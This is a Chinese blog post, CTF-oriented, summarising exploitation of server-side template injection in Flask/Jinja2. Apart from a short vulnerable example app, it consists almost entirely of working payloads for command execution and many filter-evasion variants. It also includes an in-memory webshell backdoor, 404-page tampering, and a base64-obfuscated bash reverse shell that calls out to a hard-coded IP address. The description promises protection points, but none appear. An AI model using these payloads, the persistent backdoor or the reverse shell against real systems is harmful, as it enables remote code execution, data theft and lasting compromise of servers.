---
title: "SSTI注入漏洞总结"
description: "SSTI 注入漏洞总结，整理模板注入的判断方法、利用链和防护要点。"
pubDate: "2025-12-08"
updatedDate: "2025-12-08"
tags: ["SSTI", "漏洞总结", "Web安全"]
cover: auto
coverAlt: "SSTI注入漏洞总结 的文章封面"
draft: false
---
# SSTI注入漏洞总结(python)

## 什么是SSTI

SSTI（Server-Side Template Injection，服务器端模板注入）漏洞是由于在服务器端模板引擎中不安全地处理用户输入而产生的。模板引擎通常用于生成动态网页内容，它们允许开发者在模板中嵌入代码，以便在渲染时执行。SSTI 漏洞的产生通常是因为用户输入被直接插入到模板中，并且没有进行适当的过滤或转义，从而允许攻击者注入恶意代码。

我们不难发现其实SSTI是对动态模板的利用，当服务端对用户的输入直接拼接时我们就可以进行SSTI，主要利用函数是render_template_string

## 如何利用SSTI

```
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    user = request.args.get('user', '')
    template = f"Hello, {user}!"
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True)
```

对于这样一段漏洞代码我们就可以进行SSTI注入，对jinja2模板，会渲染{{}}中的内容，实现漏洞利用

比如当存在回显时，我们传入user={{7*7}}时将会反馈49

那么如何利用SSTI漏洞实现命令执行，进一步扩展我们的成果呢，这不得不提及几个概念，对象，类和继承以及魔术方法

大家可以去自行学习一下这些的原理，简而言之就是，找基类，拿含builtins或globals的子类，然后进一步调用eval或者os进行命令执行

对象可以是以下的几种符号( [] , '' , () , {} )

以下均是拿基类的操作
```
[].__class__.__base__

''.__class__.__base__

().__class__.__base__

{}.__class__.__base__
```

也可以

```
''.__class__.__mro__[-1]
```

通过模板语法我们可以得知那些子类含有builtins

```
{% for x in [].__class__.__base__.subclasses__() %}
    {% if x.__init__ and x.__init__.__globals__ and x.__init__.__globals__.__builtins__ %}
        index : {{loop.index0}}<br>
        class : {{x.__name__}}<br>
        module : {{x.__module__}}<br>
        ----------------------<br>
    {% endif %}
{% endfor %}
```

通过模板语法我们也可以直接命令执行

```
模板语法payload，直接在popen命令执行
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'eval' in x.__init__.__globals__['__builtins__']['eval'].__name__ %}
        {{ x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()') }}
    {% endif %}
{% endfor %}
```

```
{{().__class__.__base__}}  拿基类
{{().__class__.__base__.__subclasses__()}}  拿子类
{{().__class__.__base__.__subclasses__()[103]}}找一个含builtins的类
{{().__class__.__base__.__subclasses__()[103].__init__}}初始化
{{[].__class__.__base__.__subclasses__()[103].__init__.__globals__.__builtins__['eval']('__import__("os").popen("cat /flag").read()')}}拿flag
```
可能有同学想问有没有不吃操作的手法，有的兄弟有的

>lipsum 	Jinja2 	经典跳板函数
>
>range 	Python内置 	生成序列用于遍历
>
>dict 	Python内置 	创建字典对象
>
>cycler 	Jinja2 	循环生成器
>
>joiner 	Jinja2 	字符串连接器
>
>namespace 	Jinja2 	创建命名空间
>
>url_for 	Flask 	高危跳板函数
>
>get_flashed_messages 	Flask 	类似跳板
>
>config 	Flask 	极高危，直接访问配置
>
>request 	Flask 	请求对象，泄露请求信息
>
>session 	Flask 	会话对象，读取/篡改会话
>
>g 	Flask 	访问上下文
>
>current_app 	Flask 	应用实例，高危，访问应用核心

这些全局对象可以直接调用全局变量，比如

```
{{ lipsum.__globals__ }}
```

然后按着下面的逻辑，来实现命令执行

```
{{lipsum.__globals__.__builtins__}}
{{lipsum.__globals__.__builtins__['eval']('__import__("os").popen("ls /").read()')}}

或

{{lipsum.__globals__.__builtins__}}
{{lipsum.__globals__.__builtins__.__import__('os').popen("ls /").read()}}
```

## waf

既然基操讲完了，我们细说一下waf，对于SSTI我们会遇到哪些waf呢

1.过滤{{}}

一般当过滤{{}}时，我们可以通过{% %}来过滤，{% print (''.__class__) %}基本等同于{{''.__class__}}

2.过滤关键字

有的时候会碰到如过滤__,os,import等关键字的情况

我们可以通过 [ ] 和 ' ' 以及 + 绕过

```
{{''['_'+'_class_'+'_']['_'+'_base_'+'_']['_'+'_subclasses_'+'_']}}
{{''['_'+'_class_'+'_']['_'+'_base_'+'_']['_'+'_subclasses_'+'_']()[103]['_'+'_init_'+'_']}}
{{''['_'+'_class_'+'_']['_'+'_base_'+'_']['_'+'_subclasses_'+'_']()[103]['_'+'_init_'+'_']['_'+'_glo'+'bals_'+'_']}}
{{''['_'+'_class_'+'_']['_'+'_base_'+'_']['_'+'_subclasses_'+'_']()[103]['_'+'_init_'+'_']['_'+'_glo'+'bals_'+'_']['_'+'_builtins_'+'_']['_'+'_im'+'port_'+'_']("os").popen("ls /").read()}}
```

3.过滤点

我们可以使用['__import__']代替 .__import__

如果[]也被过滤了，我们可以使用过滤器，attr()绕过

```
{{''|attr('_'+'_c'+'la'+'ss'+'__')}}
{{''|attr('__class__')}}
{{''|attr('__class__')|attr('__base__')}}
{{ (''|attr('__class__')|attr('__mro__'))|last }}
```

4.存在一种情况，当'cl' 'as' 's_'被过滤时，我们有一个很神奇的方法

```
{{[]['__ssalc__'[::-1]]}}
{{ ''|attr('__ssalc__'[::-1]) }}
```

通过切片我们可以进行反转

5.单双引号绕过

使用request请求来绕

```
request.args.key  #获取get传入的key的值

request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)

reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get

request.cookies.key  #获取cookies传入参数

request.headers.key  #获取请求头请求参数

request.data  #获取post传入参数(Content-Type:a/b)

request.json  #获取post传入json参数 (Content-Type: application/json)
```

```
{{[].__class__.__base__.__subclasses__()[103].__init__.__globals__.__builtins__.__import__(request.args.os).popen(request.args.cmd).read()}}
?os=os&cmd=ls /
```

同理可得如果让cla=__class__我们也可以通过传参绕过下划线

## 编码绕过

unicode编码可以绕过下划线

```
{% print(lipsum['\x5f\x5fglo'+'bals\x5f\x5f']['os'].popen('env').read())%}
```

waf常用的就讲这么多，接下来我们讲一点高级的

## SSTI无回显

如果使用了render_tmplate函数处理输出，我们将无法看到命令执行的回显，亦或者是对渲染进行了waf，让我们无法看到回显结果，但是存在SSTI的情况，我们就可以SSTI无回显

1.写静态目录

```
{{url_for.__globals__.__builtins__.__import__('os').popen("mkdir /app/static").read()}}
{{url_for.__globals__.__builtins__.__import__('os').popen('echo "SUCCESS" >/app/static/pwn.txt ')}}
{{url_for.__globals__.__builtins__.__import__('os').popen('ls / > /app/static/ls.txt')}}
{{url_for.__globals__.__builtins__.__import__('os').popen('cat /flag > /app/static/flag.txt')}}
{{url_for.__globals__.__builtins__.__import__('os').popen('printenv > /app/static/env.txt')}}
```

2.内存马

```
{{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']})}}
```

3.404页面污染(或者写SERVER)

```
{{ url_for.__globals__['__builtins__']['setattr'](url_for.__globals__['__builtins__']['__import__']('sys').modules['werkzeug.exceptions'].NotFound,'description','SSTI_SUCCESS_404') }}

{{ url_for.__globals__['__builtins__']['setattr'](url_for.__globals__['__builtins__']['__import__']('sys').modules['werkzeug.exceptions'].NotFound,'description',url_for.__globals__['__builtins__']['__import__']('os').popen('ls /').read().strip()) }}

{{ url_for.__globals__['__builtins__']['setattr'](url_for.__globals__['__builtins__']['__import__']('sys').modules['werkzeug.exceptions'].NotFound,'description',url_for.__globals__['__builtins__']['__import__']('os').popen('env').read().strip()) }}
```

4.盲注类似于SQL盲注可以二分优化，我目前还没遇到过，不细讲

5.反弹shell

```
{{lipsum.__globals__['os'].popen('bash${IFS}-c${IFS}\'{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTcuMjMuNDAvMTExMSAwPiYx}|{base64,-d}|{bash,-i}\'').read()}}
```



